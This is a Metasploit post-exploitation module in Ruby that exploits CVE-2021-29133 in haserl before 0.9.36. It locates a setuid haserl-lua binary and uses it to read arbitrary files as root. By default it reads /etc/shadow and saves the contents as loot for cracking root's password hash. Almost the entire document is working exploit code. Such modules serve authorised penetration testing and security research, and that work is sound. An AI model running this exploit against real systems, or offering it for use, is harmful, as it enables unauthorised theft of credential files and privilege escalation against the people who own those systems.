##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Haserl Arbitrary File Reader',
        'Description' => %q{
          This module exploits haserl prior to 0.9.36 to read arbitrary files.
          The most widely accepted exploitation vector is reading /etc/shadow,
          which will reveal root's hash for cracking.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Julien (jvoisin) Voisin', # metasploit module
          'Ike Broflovski' # discovery
        ],
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'References' => [
          ['URL', 'https://twitter.com/steaIth/status/1364940271054712842'],
          ['URL', 'https://gitlab.alpinelinux.org/alpine/aports/-/issues/12539'],
          ['CVE', '2021-29133']
        ]
      )
    )
    register_options([
      OptString.new('RFILE', [true, 'File to read', '/etc/shadow']),
    ])
  end

  def haserl_lua_paths
    begin
      files = get_suid_files('/usr/bin')
    rescue StandardError
      return
    end

    return unless files

    return files.select { |f| File.basename(f).starts_with?('haserl-lua') }
  end

  def run
    if is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges')
    end

    files = haserl_lua_paths

    if files.nil? || files.empty?
      fail_with(Failure::NotVulnerable, 'Could not find setuid haserl lua executable in /usr/bin/')
    end

    binary = files.first

    print_good("Found set-uid haserl: #{binary}")

    output = cmd_exec("#{binary} '#{datastore['RFILE']}'")

    return if output.empty?

    fname = File.basename(datastore['RFILE'].downcase)
    p = store_loot(
      "haserl_#{fname}",
      'text/plain',
      session,
      output,
      "haserl_#{fname}",
      'haserl arbitrary read'
    )
    vprint_good("#{fname} saved in: #{p}")
  end
end
